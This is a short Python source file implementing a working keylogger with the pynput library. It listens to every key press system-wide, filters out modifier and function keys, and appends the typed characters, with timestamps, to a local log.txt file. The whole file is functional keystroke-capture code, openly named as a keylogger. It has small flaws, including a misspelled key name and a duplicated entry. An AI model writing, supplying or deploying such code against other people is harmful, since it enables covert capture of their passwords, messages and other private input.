import datetime
import pynput
from pynput.keyboard import Key, Listener
import locale


buttons = ['Key.tab', 'Key.ctrl', 'Key.alt', 'Key.left', 'Key.right', 'Key.up', 'Key.down', 'Key.end', 'Key.page_down', 'Key.page_up',
           'Key.home', 'Key.end', 'Key.insert', 'Key.shift_r', 'Key.ctrt_l', 'Key.f1', 'Key.f2', 'Key.f3',
           'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 'Key.esc']




class Keylogger:
    def __init__(self):
        self.write_time()

    def on_press(self, key):
        # print(f'{key} pressed')

        for i in buttons:
            if str(key) == i:
                break

        else:
            self.write_file(key)


    def write_file(self, key):
        # print(self.count)
            # print(self.keys)
        with open('log.txt', 'a+') as file:
            k = str(key).replace("'", "")

            if k.find("backspace") > 0:
                file.write('DELETE ')

            elif k.find("space") > 0:
                file.write(" ")

            elif k.find("enter") > 0:
                file.write('\n')

            elif k.find("Key") == -1:
                file.write(k)

            file.flush()

    def write_time(self):
        with open('log.txt', 'a+') as file:
            file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')


if __name__ == "__main__":
    obj = Keylogger()
    with Listener(on_press=obj.on_press) as listener:
        listener.join()
